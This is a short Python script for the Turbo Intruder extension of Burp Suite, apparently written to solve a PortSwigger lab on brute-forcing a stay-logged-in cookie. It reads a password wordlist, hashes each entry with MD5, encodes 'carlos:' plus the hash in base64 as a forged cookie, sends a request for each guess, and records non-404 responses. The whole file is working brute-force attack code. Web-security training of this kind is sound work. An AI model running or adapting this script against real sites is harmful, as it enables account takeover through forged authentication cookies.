# Turbo Intruder script

import hashlib
import base64

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for word in open('/home/kali/portswigger/authentication/Brute-forcing a stay-logged-in cookie/passwords.txt'):
        md5sum = hashlib.md5(word.rstrip().encode()).hexdigest()
        b64_cookie = base64.b64encode('carlos:' + md5sum)
        engine.queue(target.req, b64_cookie)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
